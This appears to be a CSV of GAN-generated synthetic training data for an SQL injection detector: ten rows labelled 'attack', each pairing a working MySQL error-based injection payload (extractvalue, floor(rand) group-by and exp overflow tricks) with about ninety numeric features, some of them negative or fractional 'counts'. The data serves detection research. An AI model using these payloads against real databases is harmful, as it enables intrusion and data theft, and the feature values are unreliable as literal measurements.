id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000131,5.279554884149661,268.3601989746094,84.40975952148438,39.388160705566406,100.71771240234375,-1.54790198802948,86.08183288574219,39.17643356323242,0.8130478858947754,0.2971207797527313,0.16361814737319946,0.388173907995224,0.12199471145868301,3.8763749599456787,1.694304347038269,0.9458109140396118,0.4876241981983185,-0.018024081364274025,0.31642380356788635,0.07539059966802597,9.732236862182617,10.209317207336426,4.405271530151367,0.1331821084022522,1.698508620262146,0.18485555052757263,-0.16556845605373383,-7.115648622857407e-05,0.049376070499420166,0.9283875823020935,0.15436673164367676,-0.032844848930835724,2.071579694747925,-0.15280497074127197,0.3618994355201721,1.9791680574417114,7.454744338989258,1.060075283050537,2.7460262775421143,0.553193211555481,0.3477438986301422,0.8116270303726196,-0.258178174495697,0.023966046050190926,-0.15289311110973358,0.08138912916183472,0.23808641731739044,0.31858330965042114,0.38041913509368896,0.4195806682109833,0.13750508427619934,0.36131811141967773,-0.1033184826374054,-0.09275603294372559,0.3921763598918915,0.06316882371902466,0.10526745766401291,0.02491065487265587,0.15423989295959473,0.44991686940193176,-0.010965913534164429,0.25842007994651794,-0.11146140843629837,0.1821199655532837,0.05397411435842514,0.049200400710105896,0.6025475263595581,0.10750555992126465,-0.042585596442222595,0.07959301024675369,0.016294486820697784,-0.054754532873630524,0.06336407363414764,-0.10495873540639877,0.016311587765812874,-0.23714515566825867,1.1581367254257202,0.47391313314437866,0.10471228510141373,-0.015265294350683689,0.4672588109970093,8.65601921081543,0.9274552464485168,0.29091012477874756,0.007972106337547302,0.8992788791656494,0.16451239585876465,0.24003866314888,0.29170334339141846
GAN_000002,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.321019942737257,264.2745056152344,80.25103759765625,39.78654098510742,99.05933380126953,3.1969265937805176,90.06473541259766,38.07276153564453,1.0305616855621338,0.28821876645088196,0.16103170812129974,0.38713040947914124,0.12392798811197281,3.8442139625549316,1.4702844619750977,0.8086962699890137,0.4160253405570984,0.013408123515546322,-0.09166252613067627,-0.09649874269962311,9.694761276245117,9.711091995239258,3.820904016494751,0.13374246656894684,1.7709567546844482,0.20927982032299042,-0.05675649270415306,0.1482769399881363,0.010183497332036495,0.9257546663284302,0.28917020559310913,0.002368427813053131,2.02075457572937,-0.11221188306808472,0.2531664967536926,2.0702996253967285,7.190905570983887,0.6797506809234619,2.595921039581299,0.6824255585670471,0.4134347140789032,0.9566386342048645,0.05223332718014717,0.020353293046355247,0.09975582361221313,0.12746910750865936,-0.019597627222537994,0.33726251125335693,0.2370527982711792,0.3619963526725769,0.16971059143543243,0.4085580110549927,-0.1532963514328003,-0.03395554795861244,0.5065242052078247,0.06192614510655403,0.10321755707263947,-0.050161220133304596,0.08716001361608505,0.35168758034706116,-0.009401172399520874,0.3204846680164337,-0.019755594432353973,0.047483593225479126,0.08760103583335876,0.16126731038093567,0.6237142086029053,0.06205931305885315,-0.08754183351993561,-0.3178785443305969,-0.03437332063913345,-0.10045650601387024,-0.14733043313026428,-0.09645838290452957,0.01451817061752081,0.08435046672821045,0.9673266410827637,0.35280904173851013,0.05994243174791336,0.02699088305234909,0.491478830575943,9.489842414855957,0.823465883731842,0.30905383825302124,-0.009433752857148647,0.8046354651451111,-0.148672953248024,0.23269706964492798,0.18352855741977692
GAN_000003,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.279661950799576,269.63995361328125,78.2757339477539,41.66020202636719,101.15054321289062,3.0757837295532227,82.99325561523438,35.93439865112305,1.0131133794784546,0.3036324381828308,0.15832684934139252,0.39597195386886597,0.12439658492803574,3.8209261894226074,1.315725564956665,0.9661802649497986,0.6196951270103455,0.09368337690830231,0.13631044328212738,-0.12826618552207947,9.403873443603516,10.052497863769531,3.7801074981689453,0.2101522982120514,1.8507163524627686,0.25582435727119446,0.05576704069972038,0.21222756803035736,0.18835629522800446,0.9468305706977844,0.22440356016159058,0.024410083889961243,2.0892250537872314,-0.12795864045619965,0.2511107623577118,2.1556358337402344,7.702277183532715,0.9846439957618713,2.7513320446014404,0.5619041323661804,0.2959902584552765,0.8733367919921875,0.09094630926847458,0.03382487967610359,-0.02790047973394394,-0.06201796233654022,-0.06023285537958145,0.3300973176956177,0.2967153489589691,0.31362372636795044,0.2458709478378296,0.3187355697154999,-0.08378246426582336,0.09185122698545456,0.3925435245037079,0.11177372932434082,0.19602662324905396,0.17395736277103424,-0.2131999433040619,0.09492243081331253,0.09918669611215591,0.022853203117847443,-0.0929923877120018,-0.008627299219369888,0.09070555865764618,-0.05238495022058487,0.7273826003074646,-0.07806497812271118,-0.07335738837718964,0.035627394914627075,0.12451699376106262,-0.08816118538379669,-0.17356953024864197,-0.03856261819601059,0.01843947358429432,0.1437363624572754,1.0347248315811157,0.4539768695831299,0.20830215513706207,0.12755100429058075,0.44748035073280334,9.920519828796387,0.6665910482406616,0.2284303456544876,0.007360545918345451,0.8108216524124146,-0.03947277367115021,-0.01373462937772274,0.0006248429417610168
GAN_000004,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.367339465378136,253.33604431152344,85.11524200439453,36.639915466308594,102.76174926757812,1.960196614265442,86.45344543457031,40.6476936340332,1.0507938861846924,0.2734277844429016,0.1639927625656128,0.39088088274002075,0.12000346183776855,3.815633773803711,1.6888501644134521,0.9404811859130859,0.5352591872215271,0.011767364107072353,0.10715082287788391,0.058315061032772064,9.610583305358887,10.029972076416016,4.431342601776123,0.32480430603027344,1.62812340259552,0.15101510286331177,-0.1851346641778946,0.06771594285964966,-0.017764098942279816,0.8092221617698669,0.20385879278182983,0.4380156397819519,1.9687484502792358,0.0914670079946518,0.40297162532806396,1.8291078805923462,6.6334733963012695,0.4418640434741974,2.524381637573242,0.7411337494850159,0.3622416853904724,1.0681923627853394,-0.22286352515220642,-0.01553779374808073,-0.08328099548816681,0.09787652641534805,0.03909052908420563,0.228411003947258,0.22413642704486847,0.3158426284790039,-0.11586917191743851,0.4361017346382141,-0.03523392975330353,-0.13858401775360107,0.441533625125885,0.05206696316599846,0.10585567355155945,0.13726459443569183,0.3722473382949829,0.17544543743133545,0.013583675026893616,0.4595463275909424,0.04975399747490883,0.009132850915193558,0.07945689558982849,0.2030683159828186,0.661598265171051,-0.14773187041282654,-0.13392850756645203,-0.2611614167690277,-0.07190775871276855,-0.33628955483436584,-0.3168756365776062,-0.06825993210077286,0.0006063919863663614,0.13587696850299835,1.3831952810287476,0.3684003949165344,0.07446014881134033,-0.10632341355085373,0.43614980578422546,9.037805557250977,0.9227944016456604,0.29098275303840637,-0.0662156268954277,0.8540720343589783,-0.04451225697994232,0.5147638916969299,0.0054408833384513855
GAN_000005,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.269290730071702,266.1701354980469,78.8336410522461,39.59186553955078,102.07471466064453,1.9183517694473267,89.7468032836914,37.89263153076172,0.7935243844985962,0.28637081384658813,0.16515961289405823,0.38995301723480225,0.12172045558691025,3.8704936504364014,1.5499109029769897,0.6292173266410828,0.3743019700050354,0.01721644215285778,0.0948299914598465,0.06524652242660522,9.15383243560791,10.373970031738281,3.885377883911133,0.17528629302978516,1.7227554321289062,0.19157321751117706,-0.2208968847990036,0.11407313495874405,0.10456565767526627,0.8040570020675659,0.26343992352485657,0.07534301280975342,2.0094964504241943,-0.05842254310846329,0.31564420461654663,1.9045872688293457,7.395272254943848,1.0026084184646606,2.428558349609375,0.6529198288917542,0.31176748871803284,0.9801506996154785,-0.1518670916557312,0.015038046054542065,-0.13006383180618286,0.02871636301279068,0.16538624465465546,0.29791954159736633,0.3449549674987793,0.3593146800994873,0.2206864058971405,0.3056941032409668,-0.019818104803562164,-0.16243690252304077,0.3855400085449219,0.08803294599056244,0.08479414880275726,0.22976963222026825,0.015202797949314117,0.2893834114074707,-0.0785030648112297,0.25919413566589355,0.03539717197418213,0.025095172226428986,0.07503898441791534,0.08868514746427536,0.6024429202079773,0.01617582142353058,-0.07145556807518005,-0.15512491762638092,-0.033743053674697876,-0.1356373280286789,-0.02489427477121353,-0.07294236868619919,-0.003988295327872038,-0.0365670882165432,1.149085521697998,0.40388059616088867,0.056758154183626175,0.04573046416044235,0.45582714676856995,9.108898162841797,0.8427961468696594,0.3014829158782959,-0.014315328560769558,0.7681365013122559,0.07295973598957062,0.05777144059538841,0.08350785076618195
GAN_000006,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.216209655995735,263.310791015625,83.5137710571289,37.91981506347656,99.52298736572266,0.7721766233444214,83.9373550415039,38.188514709472656,1.1595032215118408,0.293112188577652,0.16419696807861328,0.3906092047691345,0.12321501225233078,3.799724817276001,1.7212142944335938,0.9260581731796265,0.49154478311538696,0.011272556148469448,-0.17232494056224823,0.0066946763545274734,9.680739402770996,9.606185913085938,4.015561103820801,0.16450873017311096,1.7624623775482178,0.13105398416519165,-0.020108623430132866,0.09976757317781448,-0.0009782096603885293,0.8359578847885132,0.26616188883781433,0.2516575753688812,2.022892475128174,0.008338149636983871,0.3281910717487335,1.890696406364441,6.846137523651123,0.7272923588752747,2.7977867126464844,0.9093210101127625,0.3736126124858856,0.929358720779419,-0.0820431038737297,0.02094803750514984,-0.04388376697897911,0.07668713480234146,-0.054122261703014374,0.2949877083301544,0.13260631263256073,0.30115142464637756,0.08881364017724991,0.4654407501220703,-0.15016533434391022,-0.009964726865291595,0.5001610517501831,0.045597292482852936,0.11628203839063644,-0.04291584715247154,0.30557981133461,0.3022404909133911,-0.15552011132240295,0.31875014305114746,0.011132888495922089,0.06551089882850647,0.09125309437513351,0.14715737104415894,0.7227149605751038,0.08975768089294434,-0.1321268230676651,-0.25412723422050476,0.08487430214881897,-0.23940280079841614,-0.1091308668255806,-0.01793432980775833,0.01230437308549881,0.12795650959014893,0.9965659379959106,0.4334096908569336,-0.011210575699806213,-0.04149889200925827,0.5049951672554016,9.175494194030762,0.8415157794952393,0.28461048007011414,-0.015969110652804375,0.7826153635978699,-0.09244008362293243,0.23194944858551025,0.027150079607963562
GAN_000007,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.297313425592275,262.78125,83.59636688232422,39.5338249206543,97.62596130371094,-2.633547067642212,84.8321304321289,39.89866638183594,0.9196460247039795,0.2959989905357361,0.17230750620365143,0.3899977505207062,0.12303348630666733,3.83723783493042,1.8490240573883057,0.5666047930717468,0.4720408618450165,0.05182962864637375,0.11882516741752625,0.2571311593055725,9.932126998901367,9.903281211853027,4.260167121887207,0.09197577089071274,1.6328606605529785,0.19364869594573975,-0.19488506019115448,0.11057534068822861,0.03203018009662628,0.8266304731369019,0.22713619470596313,0.010132282972335815,2.0695600509643555,-0.024000057950615883,0.32422783970832825,1.9883264303207397,7.356598854064941,0.9572645425796509,2.6446566581726074,0.8106892108917236,0.30137917399406433,0.8147791624069214,-0.06533742696046829,0.01924290508031845,-0.00619082897901535,0.06798587739467621,0.25895410776138306,0.28702056407928467,0.3051862418651581,0.3784273564815521,0.08048000186681747,0.32664579153060913,0.06990966945886612,-0.24914205074310303,0.3511786162853241,0.0624249130487442,0.15235404670238495,0.10820488631725311,-0.0017770007252693176,0.43362748622894287,0.003438018262386322,0.09179289638996124,0.0611075721681118,0.25305402278900146,0.0820087268948555,0.11407329887151718,0.6587695479393005,-0.027339205145835876,-0.1931360960006714,-0.14689365029335022,0.10318756103515625,-0.2077069878578186,-0.14769011735916138,-0.05076011270284653,0.005115000996738672,-0.08334000408649445,1.1975148916244507,0.4795043468475342,-0.03062514215707779,0.031245596706867218,0.4952102601528168,8.889917373657227,0.8915112018585205,0.3096233606338501,-0.012261263094842434,0.9304165244102478,0.061800409108400345,0.15756703913211823,0.024064630270004272
GAN_000008,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.194383260585563,271.6719665527344,79.6213150024414,41.594642639160156,101.72863006591797,2.8243191242218018,84.23951721191406,35.912986755371094,0.9487354755401611,0.304204523563385,0.15693485736846924,0.392448365688324,0.1262952983379364,3.8364193439483643,1.6223211288452148,0.8295292854309082,0.5117091536521912,0.04705645889043808,-0.0301094651222229,-0.13337574899196625,9.508862495422363,9.98976993560791,3.9202375411987305,0.19887197017669678,1.8334189653396606,0.21241970360279083,0.025647073984146118,0.12321937084197998,0.0960930809378624,0.9445732831954956,0.15825071930885315,-0.0031479373574256897,2.0358662605285645,-0.08191193640232086,0.274005651473999,2.037402629852295,7.465508937835693,0.9689845442771912,2.860599994659424,0.6215062737464905,0.4000387489795685,0.9214060306549072,0.06116494908928871,0.02396213449537754,0.06303633749485016,0.0780966579914093,-0.09343238919973373,0.3059842884540558,0.23964981734752655,0.3562365174293518,0.24856752157211304,0.4012695848941803,-0.017655223608016968,0.010134249925613403,0.47292202711105347,0.07766854017972946,0.1311149001121521,0.015640191733837128,0.04867439717054367,0.17557017505168915,-0.04078684374690056,0.055837638676166534,-0.0007656142115592957,-0.03087097778916359,0.06829280406236649,0.02082809805870056,0.6947608590126038,0.06823469698429108,-0.09637919068336487,-0.07321727275848389,0.03385821357369423,-0.05890141427516937,-0.06934027373790741,-0.0230412557721138,0.01229603961110115,0.11335514485836029,0.9821130633354187,0.422913134098053,0.11504111438989639,0.07196726649999619,0.48190099000930786,9.923089981079102,0.7571532130241394,0.245274156332016,0.018493130803108215,0.7555276155471802,-0.04957825690507889,0.07803533971309662,0.07551176846027374
GAN_000009,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.1910464265905345,271.8951416015625,80.5877914428711,41.02330780029297,101.64140319824219,-0.16372191905975342,82.0774154663086,36.57149124145508,0.9949724078178406,0.2932949364185333,0.16283462941646576,0.39375269412994385,0.12674005329608917,3.853221893310547,1.8506743907928467,0.9260005950927734,0.5017368793487549,0.07380552589893341,0.21404407918453217,0.03246714919805527,9.32085132598877,10.10108757019043,4.20246696472168,0.003730304539203644,1.773088812828064,0.19462144374847412,-0.08752778172492981,0.10237719118595123,0.11337219923734665,1.0305919647216797,0.2443518340587616,-0.027712158858776093,2.0018913745880127,0.028199100866913795,0.29546085000038147,2.026927947998047,7.611143112182617,0.8778252601623535,2.6843807697296143,0.5722643136978149,0.31616294384002686,0.8978968262672424,-0.04015504568815231,0.01602395810186863,-0.17933233082294464,0.13943980634212494,0.007725313305854797,0.3273411989212036,0.30006980895996094,0.3500891923904419,0.1811804622411728,0.39078161120414734,-0.00402628630399704,-0.05204469710588455,0.3986196517944336,0.10783515870571136,0.1542607545852661,0.18719425797462463,-0.005488589406013489,0.14924901723861694,-0.0778636485338211,0.15491312742233276,-0.006823979318141937,0.060798726975917816,0.03556593507528305,-0.10042046755552292,0.663536548614502,0.012251883745193481,0.011084867641329765,0.021810613572597504,0.0406874343752861,-0.04863625764846802,-0.02687843143939972,0.13738128542900085,0.014860833063721657,-5.118921399116516e-05,1.1288964748382568,0.425176203250885,0.012461543083190918,0.03225896507501602,0.5014699101448059,9.821730613708496,0.7886320948600769,0.2678578495979309,0.009582716040313244,0.7806838750839233,0.07568664848804474,0.2950955033302307,7.827579975128174e-05
GAN_000010,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.092626167848082,271.68927001953125,79.12242889404297,38.027095794677734,104.27311706542969,2.3466622829437256,86.64940643310547,37.74150085449219,0.8149426579475403,0.29776251316070557,0.16230612993240356,0.3884035348892212,0.12516719102859497,3.783888816833496,1.2468639612197876,0.905632495880127,0.4064132273197174,0.040851980447769165,-0.14288915693759918,-0.05667537823319435,8.940210342407227,10.111627578735352,3.8107454776763916,0.3489316701889038,1.8752456903457642,0.19400806725025177,-0.23298077285289764,0.07084408402442932,0.0926571637392044,0.802349328994751,0.13558952510356903,0.2877488434314728,2.1068694591522217,-0.2780604064464569,0.32722705602645874,1.9494853019714355,7.689575672149658,0.9660157561302185,2.7560527324676514,0.8040587306022644,0.22643056511878967,0.967573881149292,-0.155976802110672,0.03959014639258385,0.05232611298561096,-0.06733205914497375,0.09803575277328491,0.25105106830596924,0.24399037659168243,0.2925058901309967,0.1236422136425972,0.2971300780773163,-0.061648353934288025,0.021458476781845093,0.4219726026058197,0.057294417172670364,0.08598281443119049,0.09876255691051483,0.20006629824638367,0.1836867332458496,-0.030906878411769867,0.04349582642316818,-0.02772071212530136,-0.04919825866818428,0.08918052911758423,0.04018356651067734,0.7344919443130493,0.09842683374881744,-0.09501244127750397,-0.010806262493133545,0.025525502860546112,-0.13198335468769073,-0.18371593952178955,-0.09607193619012833,0.01746929995715618,0.14569401741027832,1.1496745347976685,0.5417685508728027,0.17415854334831238,0.0677606612443924,0.537467896938324,9.654135704040527,0.7645596861839294,0.2638162076473236,0.00828159786760807,0.6645427942276001,-0.13457852602005005,-0.0041794367134571075,-0.013808570802211761
